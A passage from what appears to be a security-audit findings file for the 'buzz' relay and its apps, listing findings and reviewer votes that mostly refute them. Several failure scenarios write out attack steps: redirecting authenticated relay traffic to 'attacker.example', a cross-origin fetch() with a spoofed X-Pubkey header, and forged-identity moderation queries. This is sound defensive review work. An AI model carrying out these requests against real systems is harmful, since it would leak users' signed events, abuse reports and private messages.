+    "reasoning": "The missing Rust-side owner check is factually there - parse_verified_inbound_event (desktop/src-tauri/src/commands/personas/inbound.rs:190-197) verifies only the Schnorr signature and apply_inbound_persona (inbound.rs:342-366) matches on the d-tag alone - but neither possible attacker gains anything. (1) Relay/network attacker: the sole production caller is desktop/src/features/agents/lib/usePersonaSync.ts:39, whose `if (event.pubkey !== pubkey) return;` compares against the signature-verified author field; a relay cannot forge a signature over the victim's pubkey, so a foreign-authored kind:30175 can never reach the command. grep for reconcileInboundPersonaEvent / reconcile_inbound_persona_event across desktop/src and desktop/src-tauri/src shows exactly one production call site (usePersonaSync.ts:40) plus the e2e test bridge. (2) The finding's own threat model, a compromised/XSS'd renderer invoking the command directly: that renderer can already call update_persona (desktop/src-tauri/src/commands/personas/update.rs:61 -> update_persona_with, which writes display_name, system_prompt, runtime, model, provider straight onto the persona record by id at update.rs:113-120), plus create_persona (create.rs:19), delete_persona (mod.rs:113), set_persona_shared (sharing.rs:31) and update_persona_and_publish (sharing.rs:76) - all registered in the same invoke handler in desktop/src-tauri/src/lib.rs. Rewriting a persona through the inbound path is strictly weaker than what the intended commands already give that attacker, and costs an extra signed event plus a d-tag collision. So there is no privilege gain and no reachable path from an attacker who is not already the renderer. A Rust-side owner assertion is still worth adding as defense-in-depth (the tombstone path at inbound.rs:216-223 has the analogous weakness: it ties the coordinate owner to the event author, not to the local user), but this is not an exploitable missing-authorization bug.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The missing owner check is real as a code fact \u2014 parse_verified_inbound_event (desktop/src-tauri/src/commands/personas/inbound.rs:186-197) checks only the Schnorr signature, and apply_inbound_persona (inbound.rs:342-364) matches solely on persona_d_tag \u2014 but the exploit grants the attacker nothing they do not already have, so the stated failure does not hold. The finding's own threat model is a compromised/XSS'd renderer invoking the Tauri command directly, since the untampered TS path is doubly filtered (authors:[pubkey] on both the backfill and the live subscription, desktop/src/features/agents/lib/usePersonaSync.ts:49 and :61, plus the explicit `if (event.pubkey !== pubkey) return;` at :39). A renderer that can call reconcile_inbound_persona_event can equally call update_persona, which is registered in the same invoke_handler list (desktop/src-tauri/src/lib.rs:838 vs :843) and whose request type writes precisely the fields the finding claims are the prize: system_prompt, model, provider (desktop/src-tauri/src/managed_agents/types/requests.rs:102-127) and respond_to_allowlist via PersonaBehaviorRequest (requests.rs:22-29, applied by apply_persona_behavior at requests.rs:40). update_persona (desktop/src-tauri/src/commands/personas/update.rs:61-110) takes the store lock, patches the persona by id, and saves \u2014 a direct, supported write path with no owner check to bypass. So the described escalation (attacker-chosen system prompt on a code-executing agent) is reachable by the attacker through the ordinary command surface regardless of this file, and reconcile_inbound_persona_event adds no privilege. Also note the doc comment cited as an admission (inbound.rs:186-190) is about a forged pubkey \u2014 the case the signature gate actually closes \u2014 not about a missing owner comparison. A Rust-side `event.pubkey == owner` assertion is worth adding as defense-in-depth, but it is not a missing-authorization vulnerability at high severity.",
+    "path": ""
+   }
+  ],
+  "keep_votes": 0,
+  "vote_count": 3
+ },
+ {
+  "file": "desktop/src-tauri/src/commands/workspace.rs",
+  "line": 168,
+  "severity": "high",
+  "category": "input-validation",
+  "claim": "`apply_workspace` takes a `relay_url: String` straight from the renderer and stores it as the process-wide `relay_url_override` with no parsing, scheme check, or origin allowlist. That override is the base for `relay_api_base_url_with_override` (relay.rs:50), which is (a) the target of every `query_relay`/`submit_event` call in this slice and (b) the allowlist base that `validate_download_url` (media_download.rs:31-50) compares media URLs against. One renderer-controlled command therefore redirects all NIP-98-authenticated relay traffic AND neuters the media SSRF guard. The same command also swaps `state.keys` from a renderer-supplied `nsec` (line 176-177) without taking `state.identity_mutation`, the lock every other identity-mutating path in identity.rs (lines 229, 354, 476) takes for exactly this reason.",
+  "failure_scenario": "A compromised renderer calls `apply_workspace(relay_url: \"https://attacker.example\", nsec: null, repos_dir: null, agent_managed_profiles: null)`. `relay_http_base_url` (relay.rs:73-85) passes a non-ws:// string through unchanged, so `relay_api_base_url_with_override` now returns `https://attacker.example`. From that point: every `query_relay` (relay.rs:315-341) POSTs to `https://attacker.example/query` with an `Authorization` header minted by `build_nip98_auth_header` using the user's real signing key, and every `submit_event` delivers the user's freshly-signed events to the attacker (portable signed Nostr events the attacker can then replay onto the real workspace relay). Simultaneously `validate_download_url(url, relay_base)` (media_download.rs:48) now accepts `https://attacker.example/media/...`, so `fetch_media_bytes`, `download_file`, `download_image`, and `copy_image_to_clipboard` will fetch attacker-controlled bytes with the media auth header attached. Separately, `*keys_guard = keys` at workspace.rs:176-177 can land between `persist_current_identity`'s `identity_mutation` acquisition (identity.rs:476) and its key clone (identity.rs:486), so the keyring gets persisted with a key that is no longer the live identity.",
+  "evidence": "            let mut override_guard = state.relay_url_override.lock().map_err(|e| e.to_string())?;\n            *override_guard = Some(relay_url);",
+  "confidence": "high",
+  "reported_slice": "tauri-commands",
+  "gate_a": "evidence found near claimed line 168",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 1,
+  "id": "F013",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The claimed attacker input is not remote-controlled and the claimed entry point is not an attacker entry point in a shipped build. `apply_workspace` is a Tauri command exposed only to the app's own bundled renderer; its single production caller is `desktop/src/shared/api/tauri.ts:1152`, reached from `useCommunityInit.ts:213` which passes `activeCommunity.relayUrl` \u2014 a value the user typed into the Add/Edit Community dialog and stored in local community storage (`desktop/src/features/communities/communityStorage.ts:155-165`). The one path where a remote party influences it is a `buzz://` deep link, and that only *prefills* the Add Community dialog (`addCommunityPrefill.ts:16-20`, `useAddCommunityDialogState` opens the dialog); the user still has to accept. Pointing the client at an arbitrary relay is the product's core feature, so a scheme check or origin allowlist here is not a security boundary \u2014 every workspace is by definition an arbitrary relay, and `relay_http_base_url` (relay.rs:73-85) exists precisely to map ws/wss to http/https. `validate_download_url` (media_download.rs:31-58) also still does its job: its purpose is to confine *event-supplied* media URLs to the user's own active relay origin, which it does regardless of which relay the user selected. The remaining premise is 'a compromised renderer', which already holds strictly greater privilege than the escalation claimed: the same renderer can call `submit_event`/`query_relay` directly and have `build_nip98_auth_header` (relay.rs:99-110) sign anything with the live key, so redirecting the base URL grants nothing new. The `identity_mutation` race is likewise only reachable by the local user simultaneously driving `apply_workspace(nsec=...)` and `persist_current_identity` (identity.rs:466-486), and the latter errors out unless `identity_lost` is set \u2014 no attacker-reachable path.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The premise is that the renderer is a trust boundary, but in this app it is not, and the finding gains the attacker nothing they do not already have. (1) `get_nsec` (desktop/src-tauri/src/commands/identity.rs:191) is a plain #[tauri::command] that returns the user's raw bech32 private key to the renderer on request, and `sign_event` (identity.rs:108) signs arbitrary events for it. A renderer that can call `apply_workspace` can call those instead; exfiltrating the key directly strictly dominates 'redirect NIP-98-authenticated traffic to my server to collect signed events'. There is no escalation. (2) `relay_url` is user-chosen workspace configuration by design, not attacker input: the only caller is `applyCommunity` (desktop/src/shared/api/tauri.ts:1145) from useCommunityInit.ts:213, which passes `activeCommunity.relayUrl` from the user's own saved workspace list. Demanding a 'scheme check or origin allowlist' on the URL of the relay the user deliberately joined is not a defensible control \u2014 pointing the client at an arbitrary self-hosted relay is the product's core feature. (3) The media guard is not 'neutered': `validate_download_url` (media_download.rs:31-58) exists to stop URLs embedded in *remote nostr content* from being fetched with the media auth header; it anchors to the active relay origin on purpose, so following the active relay is the intended behaviour, not a bypass. (4) The identity-race sub-claim fails on its own terms: the shipped frontend never passes an nsec to `apply_workspace` (useCommunityInit.ts:203-217 passes `undefined` and the comment documents that legacy nsec fields are stripped), and `persist_current_identity` (identity.rs:466-490) only proceeds when `identity_lost` is set and deliberately persists whatever the live key is; a concurrent legitimate key swap persisting the newer live key is the designed outcome, not corruption. No attacker input, no gain.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The code reading is accurate (relay_url is stored verbatim at workspace.rs:168, and relay_http_base_url at relay.rs:73-85 does pass a non-ws:// string through unchanged), but the finding's threat model does not survive contact with the rest of the command surface. (1) The renderer is not a trust boundary in this app: `get_nsec` (desktop/src-tauri/src/commands/identity.rs:191, registered in the invoke handler at desktop/src-tauri/src/lib.rs:686) returns the user's raw secret key as bech32 to any renderer caller, and `sign_event` is likewise exposed (lib.rs:736). A renderer that can call `apply_workspace` can simply call `get_nsec` and take the key outright, so redirecting NIP-98 traffic to harvest signed events is strictly less powerful than what is already granted by design. There is no privilege escalation. (2) The 'missing scheme check / origin allowlist' is not a defect: apply_workspace's entire purpose is to point the app at a user-chosen workspace relay (see the doc comment at workspace.rs:110-122 and the caller at desktop/src/features/communities/useCommunityInit.ts:213, which passes activeCommunity.relayUrl from the locally stored community list). An allowlist would defeat the feature; a scheme check would not help since `wss://attacker.example` is equally accepted and equally valid. (3) The 'neutered SSRF guard' framing is backwards: validate_download_url (media_download.rs:31-59) exists to pin media fetches to the *active relay's* origin, whatever the user chose. If the active relay is the attacker's, media coming from that origin is the intended behaviour, not a bypass. (4) The identity_mutation race is unreachable in a shipped build: the only production caller passes `undefined` for nsec (useCommunityInit.ts:213-219, with an explicit comment at lines 202-210 that this site refuses to apply an nsec even if present), so `parsed_keys` is always None and `*keys_guard = keys` at workspace.rs:176-177 never executes; and persist_current_identity additionally early-returns unless identity_lost is set (identity.rs:477-483).",
+    "path": ""
+   }
+  ],
+  "keep_votes": 0,
+  "vote_count": 3
+ },
+ {
+  "file": "mobile/android/app/src/main/kotlin/xyz/block/buzz/mobile/MainActivity.kt",
+  "line": 263,
+  "severity": "high",
+  "category": "correctness-crash",
+  "claim": "handleTranscodeVideoToMp4 invokes MethodChannel.Result (result.success / result.error) from a raw background Thread, violating Flutter's platform-thread contract for channel replies; FlutterJNI's ensureRunningOnMainThread throws a RuntimeException, which is uncaught in the plain Thread and crashes the app. Every Android video upload attempt hits this path.",
+  "failure_scenario": "User taps attach video in compose_bar -> MediaUploadService.uploadVideo (mobile/lib/shared/relay/media_upload.dart:264) -> _transcodePickedVideoToMp4 (media_upload.dart:742) -> invokeMethod('transcodeVideoToMp4') -> MainActivity.handleTranscodeVideoToMp4 spawns Thread{} (MainActivity.kt:216) and, on completion, calls result.success(outputFile.absolutePath) (line 263) on that background thread. The engine throws RuntimeException('Methods marked with @UiThread must be executed on the main thread'), the thread's default uncaught-exception handler terminates the process. The error path (result.error at line 266) has the same defect, so even a failed transcode crashes instead of reporting an error. Fix is runOnUiThread{}/Handler(mainLooper) around the reply.",
+  "evidence": "                muxer.stop()\n                result.success(outputFile.absolutePath)",
+  "confidence": "high",
+  "reported_slice": "mobile",
+  "gate_a": "evidence found near claimed line 263",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 1,
+  "id": "F016",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The crash premise is an unverified claim about Flutter engine internals, and it is wrong for the engine this app builds against (Dart SDK ^3.11.4, mobile/pubspec.yaml:6-7). A MethodChannel reply does not go through an @UiThread entry point: MethodChannel.IncomingMethodCallHandler.Reply forwards to DartMessenger.Reply, which calls FlutterJNI.invokePlatformMessageResponseCallback / invokePlatformMessageEmptyResponseCallback \u2014 these are the 'called on any thread' variants guarded by a `synchronized (this)` + isAttached() check, not by ensureRunningOnMainThread(). The @UiThread contract the reporter cites applies to the outbound direction (MethodChannel.invokeMethod / setMethodCallHandler / FlutterJNI.dispatchPlatformMessage), which is what Flutter's 'Jumping to the UI thread in Android' doc section is about. Decisive structural evidence: BinaryMessenger.TaskQueue (makeBackgroundTaskQueue) intentionally runs method-call handlers off the platform thread and replies through the exact same DartMessenger.Reply object; if replying off-thread threw, that supported feature could not exist. Real-world corroboration: widely deployed plugins (sqflite and similar) reply from their own background threads without crashing. On top of that, the finding asserts that every Android video upload crashes the process \u2014 compose_bar.dart:771/864 -> media_upload.dart:264 uploadVideo -> :276 _transcodeVideoToMp4 -> :742-745 invokeMethod -> MainActivity.kt:216 Thread{} -> :263 result.success is indeed the shipped path, so a hard crash there would mean the feature is 100% broken on Android in a released app, which is not credible without a repro. No crash, no security impact; at most a style nit about not hopping to the main thread.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "Not a security finding, and its central premise is unverifiable from this repo. (a) No attacker: the only way to reach handleTranscodeVideoToMp4 (MainActivity.kt:207-274) is the user personally picking a video from their own gallery (mobile/lib/shared/relay/media_upload.dart:264 uploadVideo -> :742 _transcodePickedVideoToMp4 -> invokeMethod). Nothing about the input is remote or third-party controlled; the described outcome is the user's own app closing on the user's own action. There is no confidentiality, integrity, or availability gain to anyone \u2014 a self-inflicted crash on a foreground UI action is a functional bug, not an exploit primitive. (b) The claim rests entirely on FlutterJNI.ensureRunningOnMainThread still throwing for reply callbacks in the exact engine this app pins (mobile/pubspec.yaml declares only `sdk: ^3.11.4`; no Flutter SDK, engine jar, or embedding source is present in or beside the repo, and mobile/android/settings.gradle resolves the SDK from a local.properties path that does not exist here), so I cannot verify the engine-side behaviour the whole finding depends on. (c) Even the reporter's mechanism is stated imprecisely: the `result.success(...)` at MainActivity.kt:263 sits inside the `try { ... } catch (e: Exception) { ... }` that begins at line 219, so a RuntimeException there would be caught, not immediately fatal \u2014 the crash would have to arrive via a second throw from `result.error` at :266. Per the exploitability standard (concrete attacker input, concrete gain) and the default-to-refute rule under uncertainty, this does not belong in a security advisory; it is worth reporting to the project as a plain Android correctness bug with the runOnUiThread/Handler(mainLooper) fix.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The thread-hop is real (result.success/result.error at MainActivity.kt:263/266 run inside the `Thread { ... }` started at MainActivity.kt:216), but the claimed crash mechanism is the wrong code path. Flutter's `@UiThread`/`ensureRunningOnMainThread()` assertion lives on FlutterJNI's platform-message *send* path (`dispatchPlatformMessage`, used by `MethodChannel.invokeMethod` from Android to Dart). The *reply* path a MethodChannel.Result takes is DartMessenger.Reply -> FlutterJNI.invokePlatformMessageResponseCallback / invokePlatformMessageEmptyResponseCallback, which are explicitly documented as callable from any thread and guard with a `synchronized (FlutterJNI.class)` attachment check rather than a main-thread assertion. That is why replying from a background executor is a standard plugin pattern. Two pieces of in-repo evidence corroborate that this path works in production rather than crashing on every upload: (1) the iOS implementation has the identical shape \u2014 `exportSession.exportAsynchronously { ... result(outputURL.path) }` at mobile/ios/Runner/AppDelegate.swift:297-299, whose completion block runs on an arbitrary AVFoundation queue, so if off-thread replies were fatal both platforms' video upload would be permanently broken; (2) the Dart side has an Android-specific post-processing step built on top of a *successful* return value \u2014 `rewriteMp4ForFastStart` at mobile/lib/shared/relay/media_upload.dart:751-753, reached only when `_transcodeVideoToMp4` resolves \u2014 which could not have been written or exercised if the native reply crashed the process. The finding asserts a deterministic crash on every Android video upload; that is falsifiable and false.",
+    "path": ""
+   }
+  ],
+  "keep_votes": 0,
+  "vote_count": 3
+ },
+ {
+  "file": "crates/buzz-db/src/user.rs",
+  "line": 300,
+  "severity": "high",
+  "category": "identity-revocation",
+  "claim": "A NIP-OA agent->owner delegation, once materialized, is permanent: `set_agent_owner` only writes when `agent_owner_pubkey IS NULL`, and no code path anywhere in the workspace ever clears or rotates that column. There is no revocation for an owner attestation once any single request has presented the auth tag, and the relay caches the resulting authority for 5 minutes on the explicit premise that it is immutable (crates/buzz-relay/src/state.rs:603).",
+  "failure_scenario": "Owner O issues agent key A a NIP-OA auth tag. A (or anyone holding A's tag, since the tag is a bearer credential carried in a plaintext `x-auth-tag` header at crates/buzz-relay/src/api/bridge.rs:803 or a NIP-42 AUTH tag) connects once. crates/buzz-relay/src/handlers/auth.rs:258 calls `materialize_nip_oa_owner`, which at crates/buzz-relay/src/api/mod.rs:203 calls `set_agent_owner`, permanently writing `users.agent_owner_pubkey = O` for A in that community. O later wants to revoke: the agent key is compromised, the contractor left, or the tag's own `created_at<` bound has passed. There is no `unset_agent_owner`, no UPDATE ... SET agent_owner_pubkey = NULL, and no admin command in the tree (grep for `agent_owner_pubkey` finds exactly one writer: this line). The mapping continues to authorize O over A's events (NIP-09 deletion at crates/buzz-relay/src/handlers/side_effects.rs:250/270 via `is_agent_owner`) and to mark A as O's agent for observer-frame authorization (crates/buzz-relay/src/handlers/event.rs:1003), forever. Only direct SQL against the `users` table can undo it.",
+  "evidence": "        r#\"UPDATE users SET agent_owner_pubkey = $1 WHERE community_id = $2 AND pubkey = $3 AND agent_owner_pubkey IS NULL\"#,",
+  "confidence": "high",
+  "reported_slice": "db",
+  "gate_a": "evidence found near claimed line 300",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 1,
+  "id": "F020",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The immutability read is correct (set_agent_owner at crates/buzz-db/src/user.rs:300 is first-write-wins and there is no unset path), but the security framing is wrong and no attacker gain follows. (1) The stored agent_owner_pubkey mapping does NOT grant the agent relay membership \u2014 membership-via-owner is decided fresh from the auth TAG (api/mod.rs:86 verify_auth_tag), not from the stored column, so clearing the column would not revoke access anyway. (2) The mapping's main consumers grant power to the OWNER over the agent (NIP-09 deletion authority via is_agent_owner in side_effects), not to the agent \u2014 a compromised agent gains nothing from the mapping persisting. (3) The only agent-facing capability, publishing kind:24200 observer frames to the owner (event.rs:1003/1016), is fully cut off by banning the agent pubkey: the ban gate at handlers/auth.rs:119-184 runs before the membership gate and closes the connection, so O has a working revocation path without any SQL. (4) Immutability is a deliberate security property (state.rs:603): first-write-wins prevents an attacker who compromises the agent key from rebinding it to a different owner. No persistent, non-revocable attacker capability exists.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The code fact is accurate \u2014 set_agent_owner (user.rs:299-300) only writes when agent_owner_pubkey IS NULL and there is no UPDATE...SET NULL / unset path in the tree \u2014 but the claimed security consequence ('a revoked/compromised agent still authenticates and acts, forever, with no revocation') is wrong. Revocation of a specific agent exists via moderation: the AUTH ban seam (handlers/auth.rs:119-183) calls moderation_restriction_state on the agent pubkey directly and denies+closes the socket before any membership grant, and ingest re-checks bans; banning the compromised agent key blocks connection auth regardless of the owner mapping. Membership-via-owner is also live-evaluated on every AUTH (check_relay_membership re-runs is_relay_member(owner) each time, api/mod.rs:89-94), not frozen by the cached mapping, so removing the owner's membership cuts the agent's inherited access. The permanent agent_owner_pubkey mapping grants the OWNER authority OVER the agent (is_agent_owner is used to let the owner delete the agent's events, side_effects.rs:250/270, and to authorize the owner<->agent observer channel, event.rs:1003) \u2014 that is the owner retaining moderation power, not an access grant TO the agent that a compromise would exploit. The described 'forever authorizes O over A' outcome is beneficial to O, and the agent-access concern is covered by the ban path the finding did not consider.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The mechanical observation is right \u2014 user.rs:291-325 is the only writer of agent_owner_pubkey and a repo-wide grep finds no UPDATE ... SET agent_owner_pubkey = NULL \u2014 but this is documented, intentional immutability (buzz-db/src/channel.rs:553 and buzz-relay/src/state.rs:603 both state it), and the security story built on it does not hold. First, direction: the mapping confers authority on the OWNER over the agent (is_agent_owner gates in side_effects.rs:250/270/478/707) and marks the agent as an agent; a compromised agent key gains nothing from the row existing. Second, clearing the column would not revoke anything, because the underlying artefact is a signed attestation the owner really issued: any later connection presenting the same tag re-runs materialize_nip_oa_owner (api/mod.rs:174-232) and rewrites the identical row, so 'revocation' would require rejecting the tag, not deleting the row. Third, real revocation levers exist and are wired into the same auth path the finding cites: ban the agent (or the owner, which cascades to agents) via buzz-db/src/moderation.rs:313 enforced at handlers/auth.rs:119-155, which denies the AUTH outright before any membership or observer logic; and remove the owner from relay_members (handlers/relay_admin.rs:329-336, buzz-admin/src/main.rs:215-218), which kills the ViaOwner grant at api/mod.rs:94. The 5-minute observer_owner_cache TTL (state.rs:601-607) is also community-scoped and bounded, not an amplifier. What remains is a missing admin convenience (an unset_agent_owner command), i.e. hardening, not an identity-revocation vulnerability.",
+    "path": ""
+   }
+  ],
+  "keep_votes": 0,
+  "vote_count": 3
+ },
+ {
+  "file": "crates/buzz-relay/src/api/bridge.rs",
+  "line": 2091,
+  "severity": "high",
+  "category": "authorization",
+  "claim": "`authorize_moderation_read` \u2014 the single gate in front of `GET /moderation/reports`, `/moderation/audit`, and `/moderation/restricted` (mounted publicly at router.rs:114-119) \u2014 passes `state.config.require_auth_token` into `verify_bridge_auth`, so the moderator-capability check at bridge.rs:2095-2109 is performed against a caller identity that, under the default config, was supplied by an unauthenticated request header. The capability check itself (`authorize_moderation_action(... ViewQueue)`) is correct; its input is not. The data behind it is the most sensitive in the deployment: `report_json` (bridge.rs:2190) emits `reporter_pubkey` and the reporter's free-text `note`, `action_json` (bridge.rs:2213) emits `private_reason`, and `ban_json` (bridge.rs:2229) emits the full restricted-member roster.",
+  "failure_scenario": "Attacker learns any moderator's pubkey (moderators sign public moderation-command events 9040-9044, and NIP-43 membership snapshots list admin/owner roles). They issue `GET /moderation/reports?limit=500` with `Host: <tenant>` and `X-Pubkey: <moderator hex>` and no Authorization header. `verify_bridge_auth` takes the dev fallback at bridge.rs:118, returns the moderator pubkey, `check_nip98_replay` no-ops on the zero id, `authorize_moderation_action` sees a genuine moderator and returns Ok, and the handler returns every report with reporter identities and notes. Repeating against `/moderation/audit` yields every moderator's `private_reason` text; against `/moderation/restricted` the full ban list. This de-anonymises every abuse reporter in the community.",
+  "evidence": "    let (pubkey, event_id_bytes) =\n        verify_bridge_auth(headers, \"GET\", &url, None, state.config.require_auth_token)?;",
+  "confidence": "high",
+  "reported_slice": "relay",
+  "gate_a": "evidence found near claimed line 2091",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 1,
+  "id": "F024",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "low",
+    "reasoning": "The X-Pubkey path is not a moderation-endpoint defect; it is the deployment-wide dev fallback, and it is off in every shipped deployment artifact. crates/buzz-relay/src/api/bridge.rs:117-125 gates it entirely on `!require_auth_token`. The env default is false (crates/buzz-relay/src/config.rs:524-526), but the shipped configs set it true: deploy/charts/buzz/values.yaml:108 `requireAuthToken: true`, deploy/compose/.env.example:16 `BUZZ_REQUIRE_AUTH_TOKEN=true`. The code also refuses to let a production identity coexist with dev mode \u2014 crates/buzz-relay/src/main.rs:437 panics with \"BUZZ_RELAY_PRIVATE_KEY must be set when BUZZ_REQUIRE_AUTH_TOKEN=true\", and main.rs:429-433 loudly warns that it is using a hardcoded all-ones dev keypair when the flag is false \u2014 plus config.rs:637-642 logs \"REST API requests bypass token auth ... Set to true for production\" and deploy/charts/buzz/templates/NOTES.txt:58-59 surfaces the same warning at install time. So the only build where the described attack works is one running with an explicitly-labelled dev toggle and a publicly-known hardcoded relay private key, i.e. already fully compromised for unrelated reasons. Second problem with the framing: the finding is scoped to `authorize_moderation_read`, but `verify_bridge_auth` is the shared bridge-auth helper used by every bridge endpoint, so nothing about the moderation gate is special or defective \u2014 bridge.rs:2095-2109 correctly calls `authorize_moderation_action(... ViewQueue)`, and the reporter concedes the capability check itself is correct. Refuted as a moderation authorization finding; at most this is a note that dev mode should be harder to leave on.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The X-Pubkey path is not a flaw in authorize_moderation_read \u2014 it is the crate-wide dev-mode fallback in verify_bridge_auth_with_options (crates/buzz-relay/src/api/bridge.rs:117-125), gated on require_auth_token and shared by every bridge REST endpoint, so moderation reads are neither specially weakened nor the only thing exposed under it. More importantly, the premise 'under the default config' does not describe a shipped deployment. Both production configurations in the repo disable it: deploy/charts/buzz/templates/deployment.yaml:131 wires BUZZ_REQUIRE_AUTH_TOKEN from deploy/charts/buzz/values.yaml:108, which is `requireAuthToken: true`, and deploy/compose/.env.example:16 sets BUZZ_REQUIRE_AUTH_TOKEN=true under a comment reading 'Production defaults'. The binary's own default (crates/buzz-relay/src/config.rs:522-524, false) exists for local dev and test harnesses (scripts/start-relay-for-tests.sh:159, CI, desktop e2e) and emits a loud startup warning naming the exact consequence: 'BUZZ_REQUIRE_AUTH_TOKEN is false \u2014 REST API requests bypass token auth ... Set to true for production' (config.rs:637-642); it is also documented as such in TESTING.md:278 and NOSTR.md:327. With the shipped production setting, the X-Pubkey branch is unreachable, NIP-98 signature verification (bridge.rs:112) plus the Redis replay guard (bridge.rs:145-175) authenticate the caller, and the ViewQueue capability check the reporter concedes is correct then runs on a proven identity. So the concrete attacker gain requires the operator to have overridden both shipped production configs and ignored the startup warning \u2014 a deployment-hardening item, not a reachable authorization defect in the cited gate.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": false,
+    "severity": "low",
+    "reasoning": "The code path is exactly as described and I could not find a guard the reporter missed -- no auth middleware layer over these routes, and the zero-id short-circuit really does skip replay detection. But the finding's framing is wrong in the way that matters for an advisory, so I downgrade to low. First, this is not a defect in authorize_moderation_read: the X-Pubkey fallback is the documented dev-mode identity source used uniformly by every bridge endpoint via verify_bridge_auth (bridge.rs:62-70); reporting it as a moderation-specific authorization bug misattributes it. Second, \"under the default config\" is true only of the bare binary's env-var default, which is loud about it: config.rs:637-642 logs a startup warning that REST requests bypass token auth, and crates/buzz-relay/src/main.rs:431-437 refuses to run with a real relay key in that mode, falling back to a hardcoded dev keypair. The project's actual deployment artifacts ship it secure -- deploy/charts/buzz/values.yaml:108 requireAuthToken: true and deploy/compose/.env.example:16 BUZZ_REQUIRE_AUTH_TOKEN=true -- and every occurrence of =false is in CI, test harnesses, and local-dev scripts. So the real finding is \"the insecure dev default should fail closed, or at least the dev fallback should be excluded from endpoints that return reporter identities and private_reason,\" which is a hardening recommendation, not a shipped high-severity data-exposure vulnerability.",
+    "path": "GET /moderation/reports?limit=500 with Host: <tenant>, X-Pubkey: <moderator hex>, no Authorization header -> crates/buzz-relay/src/router.rs:114 (route is on the public router; the only layers are a 1 MB body limit at router.rs:129, metrics, trace, CORS) -> crates/buzz-relay/src/api/bridge.rs:2091 verify_bridge_auth(..., state.config.require_auth_token) -> bridge.rs:117-124 dev-mode X-Pubkey branch taken because require_auth_token defaults false (crates/buzz-relay/src/config.rs:524-526) and returns the header-supplied pubkey with a zero event id -> bridge.rs:2093 check_nip98_replay returns Ok immediately on the zero hash (bridge.rs:149-151) -> bridge.rs:2095-2109 authorize_moderation_action(ViewQueue) succeeds because the spoofed pubkey is a genuine community owner/admin -> handler emits report_json (bridge.rs:2190) with reporter_pubkey and note."
+   }
+  ],
+  "keep_votes": 1,
+  "vote_count": 3
+ },
+ {
+  "file": "crates/buzz-relay/src/router.rs",
+  "line": 425,
+  "severity": "high",
+  "category": "cors-misconfiguration",
+  "claim": "When `BUZZ_CORS_ORIGINS` is unset the relay installs `CorsLayer::permissive()` \u2014 `Access-Control-Allow-Origin: *` plus `Any` methods and `Any` headers \u2014 over the entire merged router (router.rs:190-192), which includes `/events`, `/query`, `/count`, `/moderation/*`, `/api/invites/*`, `/operator/*`, `/media/*` and the git smart-HTTP routes. Permissive CORS explicitly allows the custom `X-Pubkey` header through preflight, so it converts the header-based identity fallback described above from a server-side-only bypass into a browser-driveable one. Note the contrast with the code immediately below at router.rs:433-440, where an *invalid* origins list deliberately refuses to fall back to permissive (\"refusing to fall back to permissive CORS\") \u2014 the unset case gets no such protection.",
+  "failure_scenario": "A victim with any browser visits an attacker-controlled page while the relay is reachable from their network (typical for an internal/company relay). The page runs `fetch('https://relay.example/query', {method:'POST', headers:{'X-Pubkey':'<victim hex>','Content-Type':'application/json'}, body:'[{}]'})`. Because `CorsLayer::permissive()` answers the preflight with `Allow-Headers: *` and `Allow-Origin: *`, the browser sends the request and hands the JSON response body back to attacker JavaScript. Combined with the X-Pubkey fallback the attacker exfiltrates the victim's private-channel history cross-origin with no credentials and no user interaction. Even with `require_auth_token=true`, permissive CORS still exposes every response body of any endpoint reachable with ambient credentials.",
+  "evidence": "    if cors_origins.is_empty() {\n        return CorsLayer::permissive();\n    }",
+  "confidence": "high",
+  "reported_slice": "relay",
+  "gate_a": "evidence found near claimed line 425",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 1,
+  "id": "F025",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": false,
+    "severity": "low",
+    "reasoning": "The code claim is accurate \u2014 `build_cors_layer` (crates/buzz-relay/src/router.rs:423-426) returns `CorsLayer::permissive()` whenever `cors_origins` is empty, and `cors_origins` is empty by default (config.rs:644-649 collects `BUZZ_CORS_ORIGINS`, filtering empties). That layer is applied once over the merged router at router.rs:190-192, so it does cover /events, /query, /count, /moderation/*, /api/invites/*, /operator/*, /media/*, and the git routes. But the reporter's amplifying claim is wrong on the facts and that is what carries the 'high' rating: `CorsLayer::permissive()` sets allow_origin(Any)/methods(Any)/headers(Any)/expose(Any) and does NOT set `Access-Control-Allow-Credentials`. There are no ambient credentials to steal in the first place \u2014 I grepped the whole relay for cookie/Basic/session auth and found none; every authenticated route uses NIP-98 `Authorization: Nostr <base64>` (api/bridge.rs:81-114) or the git NIP-98 extractor (api/git/transport.rs:88-192), both of which the attacker's page cannot forge without the victim's key. So 'permissive CORS still exposes every response body of any endpoint reachable with ambient credentials' is false. What is left is real but much narrower: with `require_auth_token=false` (default, and loudly warned about at config.rs:637-641) the `x-pubkey` fallback at bridge.rs:117-125 accepts an unauthenticated identity claim, and permissive CORS is genuinely load-bearing for reaching that from a browser (a POST with a custom `X-Pubkey` header requires a preflight, which a non-permissive relay would 